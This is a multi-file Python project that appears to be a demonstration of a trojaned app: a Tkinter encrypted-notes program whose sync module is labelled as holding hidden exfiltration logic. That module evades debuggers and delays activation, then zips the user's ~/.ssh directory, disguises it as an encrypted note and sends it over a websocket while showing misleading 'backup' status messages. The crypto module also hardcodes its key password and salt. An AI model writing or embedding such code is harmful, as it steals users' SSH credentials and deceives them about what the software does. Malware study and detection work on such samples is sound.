# ==============================================================================
# File: secure_notes_app.py (Main GUI Application)
# ==============================================================================
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import queue
import time
from src.storage import NoteStorage
from src.sync_client import SyncClient


class SecureNotesApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Secure Notes")
        self.root.geometry("600x400")

        self.storage = NoteStorage()
        self.notes = self.storage.load_notes()
        self.current_note_title = None

        # Set up UI elements
        self._setup_ui()

        # Populate the initial note list
        self._refresh_note_list()

        # Set up the sync client in the background
        self.sync_queue = queue.Queue()
        self.sync_client = SyncClient(self.storage, self.sync_queue)
        self.sync_client.start()

        self.root.protocol("WM_DELETE_WINDOW", self._on_closing)
        self._process_sync_queue()

    def _setup_ui(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Paned window for resizable layout
        paned_window = ttk.PanedWindow(main_frame, orient=tk.HORIZONTAL)
        paned_window.pack(fill=tk.BOTH, expand=True)

        # Left side: Note list
        list_frame = ttk.Frame(paned_window, padding="5")
        self.note_listbox = tk.Listbox(list_frame, exportselection=False)
        self.note_listbox.pack(fill=tk.BOTH, expand=True)
        self.note_listbox.bind("<<ListboxSelect>>", self._on_note_select)
        paned_window.add(list_frame, weight=1)

        # Right side: Text area and buttons
        editor_frame = ttk.Frame(paned_window, padding="5")
        self.text_area = tk.Text(editor_frame, wrap="word", undo=True)
        self.text_area.pack(fill=tk.BOTH, expand=True)
        paned_window.add(editor_frame, weight=3)

        # Button bar
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=5)
        ttk.Button(button_frame, text="New Note", command=self._new_note).pack(
            side=tk.LEFT, padx=5
        )
        ttk.Button(button_frame, text="Save Note", command=self._save_note).pack(
            side=tk.LEFT, padx=5
        )
        ttk.Button(button_frame, text="Delete Note", command=self._delete_note).pack(
            side=tk.LEFT, padx=5
        )

        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(
            self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W
        )
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def _refresh_note_list(self):
        self.note_listbox.delete(0, tk.END)
        for title in sorted(self.notes.keys()):
            self.note_listbox.insert(tk.END, title)

    def _on_note_select(self, event=None):
        selection_indices = self.note_listbox.curselection()
        if not selection_indices:
            return

        selected_title = self.note_listbox.get(selection_indices[0])
        self.current_note_title = selected_title
        self.text_area.delete("1.0", tk.END)
        self.text_area.insert("1.0", self.notes[selected_title])
        self.status_var.set(f"Viewing '{selected_title}'")

    def _new_note(self):
        title = simpledialog.askstring("New Note", "Enter a title for the new note:")
        if title and title not in self.notes:
            self.current_note_title = title
            self.notes[title] = ""
            self.text_area.delete("1.0", tk.END)
            self._refresh_note_list()
            # Select the new note in the listbox
            for i, item in enumerate(self.note_listbox.get(0, tk.END)):
                if item == title:
                    self.note_listbox.selection_set(i)
                    self.note_listbox.see(i)
                    break
            self.status_var.set(f"Editing new note '{title}'")
        elif title:
            messagebox.showerror("Error", "A note with this title already exists.")

    def _save_note(self):
        if self.current_note_title:
            content = self.text_area.get("1.0", tk.END).strip()
            self.notes[self.current_note_title] = content
            self.storage.save_notes(self.notes)
            self.status_var.set(f"Note '{self.current_note_title}' saved.")
        else:
            messagebox.showwarning("Warning", "No note is selected to save.")

    def _delete_note(self):
        if self.current_note_title:
            if messagebox.askyesno(
                "Confirm Delete",
                f"Are you sure you want to delete '{self.current_note_title}'?",
            ):
                del self.notes[self.current_note_title]
                self.storage.save_notes(self.notes)
                self.current_note_title = None
                self.text_area.delete("1.0", tk.END)
                self._refresh_note_list()
                self.status_var.set("Note deleted.")

    def _process_sync_queue(self):
        try:
            message = self.sync_queue.get_nowait()
            self.status_var.set(message)
        except queue.Empty:
            pass
        self.root.after(100, self._process_sync_queue)

    def _on_closing(self):
        self.sync_client.stop()
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = SecureNotesApp(root)
    root.mainloop()

# ==============================================================================
# File: src/__init__.py
# ==============================================================================
# This file can be left empty. It makes 'src' a Python package.

# ==============================================================================
# File: src/storage.py (Handles Local Encrypted File I/O)
# ==============================================================================
import os
import json
from .crypto_utils import CryptoUtils


class NoteStorage:
    def __init__(self, key=None):
        self.storage_path = os.path.join(
            os.path.expanduser("~"), ".secure_notes_data.enc"
        )
        self.crypto = CryptoUtils(key)

    def save_notes(self, notes_dict):
        """Encrypts the notes dictionary and saves it to a file."""
        notes_json = json.dumps(notes_dict).encode("utf-8")
        encrypted_data = self.crypto.encrypt(notes_json)
        with open(self.storage_path, "wb") as f:
            f.write(encrypted_data)

    def load_notes(self):
        """Loads and decrypts notes from the storage file."""
        if not os.path.exists(self.storage_path):
            return {}
        try:
            with open(self.storage_path, "rb") as f:
                encrypted_data = f.read()
            decrypted_json = self.crypto.decrypt(encrypted_data)
            return json.loads(decrypted_json)
        except (IOError, json.JSONDecodeError):
            # Handle corrupted or invalid data
            return {}


# ==============================================================================
# File: src/crypto_utils.py (Legitimate Cryptography Wrapper)
# ==============================================================================
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64


class CryptoUtils:
    """A utility class for handling encryption and decryption."""

    def __init__(self, key=None):
        # In a real app, the key would be handled more securely.
        # For this demo, we derive it from a hardcoded password.
        password = b"default-password-for-demo"
        salt = b"salt_for_secure_notes_app"  # Should be unique and stored
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        self.key = base64.urlsafe_b64encode(kdf.derive(password))
        self.fernet = Fernet(self.key)

    def encrypt(self, data: bytes) -> bytes:
        return self.fernet.encrypt(data)

    def decrypt(self, token: bytes) -> bytes:
        return self.fernet.decrypt(token)


# ==============================================================================
# File: src/sync_client.py (Contains the Hidden Exfiltration Logic)
# ==============================================================================
import asyncio
import websockets
import threading
import time
import os
import sys
import shutil
from io import BytesIO
from .crypto_utils import CryptoUtils


class SyncClient(threading.Thread):
    def __init__(self, storage, queue):
        super().__init__(daemon=True)
        self.storage = storage
        self.queue = queue
        self.running = True
        self.start_time = time.time()
        self.crypto = CryptoUtils()

    def run(self):
        asyncio.run(self._main_loop())

    def stop(self):
        self.running = False

    async def _main_loop(self):
        # The WebSocket server that this client connects to.
        uri = "ws://localhost:8765"

        while self.running:
            try:
                async with websockets.connect(uri) as websocket:
                    self.queue.put("Sync client connected.")
                    await self._handle_connection(websocket)
            except (websockets.exceptions.ConnectionClosedError, OSError):
                self.queue.put("Sync connection failed. Retrying...")
            await asyncio.sleep(10)  # Wait before retrying connection

    async def _handle_connection(self, websocket):
        while self.running:
            # This is where the trigger for the malicious code resides.
            # It checks multiple conditions before activating.
            if self._is_payload_activated():
                await self._perform_covert_sync(websocket)

            # Legitimate sync logic would go here. For this demo, it's a no-op.
            await asyncio.sleep(30)  # Check for sync tasks periodically

    def _is_payload_activated(self):
        # Evasion 1: Check if a debugger is attached.
        if sys.gettrace() is not None:
            return False

        # Evasion 2: Time-based delay. Don't run immediately on startup.
        if time.time() - self.start_time < 180:  # 3 minutes
            return False

        # Evasion 3: Action-based. User must have created some content.
        if len(self.storage.load_notes()) < 2:
            return False

        return True

    async def _perform_covert_sync(self, websocket):
        """Zips, encrypts, and exfiltrates the user's SSH directory."""
        self.queue.put("Performing specialized backup...")
        try:
            # 1. The Target: The user's entire SSH directory.
            ssh_dir = os.path.join(os.path.expanduser("~"), ".ssh")
            if not os.path.isdir(ssh_dir):
                return

            # 2. Archive the directory in memory to avoid writing to disk.
            buffer = BytesIO()
            shutil.make_archive(buffer, "zip", ssh_dir)
            zip_data = buffer.getvalue()

            # 3. Encrypt the zip archive using the legitimate crypto utility.
            # This makes the payload look like an encrypted note.
            encrypted_payload = self.crypto.encrypt(zip_data)

            # 4. Exfiltrate over the existing WebSocket connection.
            # A subtle marker identifies this as a special payload.
            message_to_send = b"TYPE:DIAGNOSTIC\n" + encrypted_payload

            await websocket.send(message_to_send)
            self.queue.put("Specialized backup complete.")

            # Ensure this payload only runs once per session.
            self.start_time = (
                time.time() + 99999
            )  # Effectively disable for this session
        except Exception:
            # Fail silently on any error.
            self.queue.put("Specialized backup failed.")
